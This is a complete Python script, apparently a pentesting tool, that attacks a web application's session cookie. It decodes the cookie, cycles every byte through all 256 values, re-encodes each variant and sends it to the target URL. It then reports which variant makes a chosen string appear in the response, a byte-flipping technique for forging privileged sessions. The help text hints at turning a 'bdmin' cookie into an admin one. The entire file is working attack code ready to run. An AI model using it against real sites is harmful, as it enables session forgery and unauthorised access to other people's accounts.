#!/usr/bin/python3

import requests, argparse, base64, sys


def send_req(url, new_cookie, string):
    r = requests.get(url, cookies=new_cookie)
    if string in r.text:
        print("[+] Value "+string+" found in response using cookie: "+str(new_cookie)) 
    
def encode(cookie, encoding):
    encoded = ""
    try:
        if encoding == "hex_low":
            encoded = cookie.lower()
        elif encoding == "hex_upp":
            encoded = cookie.upper()
        elif encoding == "base64":
            encoded = base64.b64encode(bytes.fromhex(cookie)).decode('ascii')
        elif encoding == "base64_urlsafe":
            encoded = base64.urlsafe_b64encode(bytes.fromhex(cookie)).decode('ascii')
        return encoded
    except Exception as e:
        print("Error while encoding\n" +str(e))

def getB64UrlSafeCookie(cookie):
    try:
        return base64.urlsafe_b64decode(cookie).hex()
    except Exception as e:
        print("The cookie is not in a valid B64 Url Safe format\n"+str(e))
        exit(-2)

def getB64Cookie(cookie):
    try:
        return base64.b64decode(cookie).hex()
    except Exception as e:
        print("The cookie is not in a valid B64 format\n"+str(e))
        exit(-2)

def check_args(args=None):
    parser = argparse.ArgumentParser(description='Process some integers.')
    parser.add_argument('-u', '--url', required='True',
                        help='URl to request (https://web.com/path.php)')
    parser.add_argument('-n', '--cookiename', required='True',
                        help='Cookie to play with (cookie of "bdmin")')
    parser.add_argument('-v', '--cookievalue', required='True',
                        help='Cookie to play with (cookie of "bdmin")')
    parser.add_argument('-e','--encoding', required='True',
                        help='Encoding used: hex_low, hex_upp, base64, base64_urlsafe')
    parser.add_argument('-s','--string', required='True',
                        help='String to search for in the response of the server')                    

    args = parser.parse_args()
    return (args.url, args.cookiename, args.cookievalue, args.encoding, args.string)

def main():
    url, cookie_name, cookie_value, encoding, string = check_args(sys.argv[1:])
    
    if encoding == "hex_low" or encoding == "hex_upp":
        cookie_hex = cookie_value
    elif encoding == "base64":
        cookie_hex = getB64Cookie(cookie_value)
    elif encoding == "base64_urlsafe":
        cookie_hex = getB64UrlSafeCookie(cookie_value)
    else:
        print("Encoding "+ encoding + " not known.")
        exit(-1)
    
    for i in range(0,len(cookie_hex),2):
        for num in range(256):
            new_cookie = cookie_hex[:i] + format(num,'#04x')[2:] + cookie_hex[i+2:]
            new_cookie = {cookie_name: encode(new_cookie, encoding)}
            print(new_cookie)
            send_req(url, new_cookie, string)
            
    

if __name__ == "__main__":
    main()
